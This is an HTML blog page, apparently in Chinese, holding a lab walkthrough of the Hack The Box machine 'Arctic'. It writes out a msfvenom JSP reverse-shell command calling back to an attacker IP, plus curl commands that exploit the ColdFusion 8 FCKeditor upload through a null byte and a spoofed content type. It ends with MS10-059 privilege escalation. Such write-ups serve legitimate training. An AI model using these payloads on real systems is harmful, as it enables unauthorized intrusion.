@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Arctic | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="nmap scan  #### port 135 #### port 8500 web访问8500端口，可以看到一个目录结构，在http:&#x2F;&#x2F;10.10.10.11:8500&#x2F;CFIDE&#x2F;administrator&#x2F;该目录下能看到一个登陆界面，且用户名是admin 该登陆界面显示为adobe coldfusion 8  在源码中可以看到密码上需要加密的，有一个salt   #### get web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Arctic">
+<meta property="og:url" content="http://example.com/2022/08/29/Arctic/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="nmap scan  #### port 135 #### port 8500 web访问8500端口，可以看到一个目录结构，在http:&#x2F;&#x2F;10.10.10.11:8500&#x2F;CFIDE&#x2F;administrator&#x2F;该目录下能看到一个登陆界面，且用户名是admin 该登陆界面显示为adobe coldfusion 8  在源码中可以看到密码上需要加密的，有一个salt   #### get web">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/08/29/Arctic/nmap1.png">
+<meta property="og:image" content="http://example.com/2022/08/29/Arctic/nmap2.png">
+<meta property="og:image" content="http://example.com/2022/08/29/Arctic/85001.png">
+<meta property="og:image" content="http://example.com/2022/08/29/Arctic/85002.png">
+<meta property="og:image" content="http://example.com/2022/08/29/Arctic/burp.png">
+<meta property="og:image" content="http://example.com/2022/08/29/Arctic/cold.png">
+<meta property="og:image" content="http://example.com/2022/08/29/Arctic/web.png">
+<meta property="og:image" content="http://example.com/2022/08/29/Arctic/web2.png">
+<meta property="og:image" content="http://example.com/2022/08/29/Arctic/nc1.png">
+<meta property="og:image" content="http://example.com/2022/08/29/Arctic/shell1.png">
+<meta property="og:image" content="http://example.com/2022/08/29/Arctic/root.png">
+<meta property="article:published_time" content="2022-08-29T04:59:10.000Z">
+<meta property="article:modified_time" content="2022-08-29T06:31:01.101Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/08/29/Arctic/nmap1.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-Arctic" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/08/29/Arctic/" class="article-date">
+  <time class="dt-published" datetime="2022-08-29T04:59:10.000Z" itemprop="datePublished">2022-08-29</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      Arctic
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h4 id="nmap-scan"><a href="#nmap-scan" class="headerlink" title="nmap scan"></a>nmap scan</h4><img src="/2022/08/29/Arctic/nmap1.png">
+<img src="/2022/08/29/Arctic/nmap2.png">
+#### port 135
+#### port 8500
+web访问8500端口，可以看到一个目录结构，在http://10.10.10.11:8500/CFIDE/administrator/该目录下能看到一个登陆界面，且用户名是admin
+该登陆界面显示为adobe coldfusion 8
+<img src="/2022/08/29/Arctic/85001.png">
+在源码中可以看到密码上需要加密的，有一个salt
+<img src="/2022/08/29/Arctic/85002.png">
+<img src="/2022/08/29/Arctic/burp.png">
+#### get web shell
+搜索coldfusion可以找到几个可利用的文件
+<img src="/2022/08/29/Arctic/cold.png">
+看到一个可以通过msf进行文件上传的version8的漏洞利用
+直接利用显示失败
+查看该利用的源码
+在利用阶段该脚本首先上传一个文件到/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm
+然后通过访问触发该文件
+于是我们可以自己制作一个jspshell并上传
+`msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.2 LPORT=8888 -f raw > shell.jsp`
+`curl -X POST -F newfile=@shell.jsp 'http://10.10.10.11:8500/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/df.jsp%00`
+在传完了以后在根目录下会出现一个新的文件夹userfiles
+<img src="/2022/08/29/Arctic/web.png">
+但是该目录下并不存在刚刚上传的文件
+说明上传时触发了防御机制
+MSF脚本中上传的是txt文件，且将上传类型改为了application/x-java-archive
+`curl -X POST -F "newfile=@shell.jsp;type=application/x-java-archive;filename=shell.txt" 'http://10.10.10.11:8500/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/abc.jsp%00'`
+<img src="/2022/08/29/Arctic/web2.png">
+可以看到这次已经上传成功了
+开一个nc监听8888端口，并访问触发该脚本
+<img src="/2022/08/29/Arctic/nc1.png">
+拿到shell权限后使用systeminfo和windows-exploit-suggester
+<img src="/2022/08/29/Arctic/shell1.png">
+用ms10-059
+用smbserver传一个MS10-059.exe到目标机器的programdata
+开一个nc监听新的端口
+<img src="/2022/08/29/Arctic/root.png">
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/08/29/Arctic/" data-id="cl7edtt3w0000jtcpczmx23a7" data-title="Arctic" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/08/29/Buff/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          Buff
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/08/28/Devel/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Devel</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">July 2022</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/08/30/Networked/">Networked</a>
+          </li>
+        
+          <li>
+            <a href="/2022/08/29/Buff/">Buff</a>
+          </li>
+        
+          <li>
+            <a href="/2022/08/29/Arctic/">Arctic</a>
+          </li>
+        
+          <li>
+            <a href="/2022/08/28/Devel/">Devel</a>
+          </li>
+        
+          <li>
+            <a href="/2022/07/28/oscp/">oscp</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2022 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
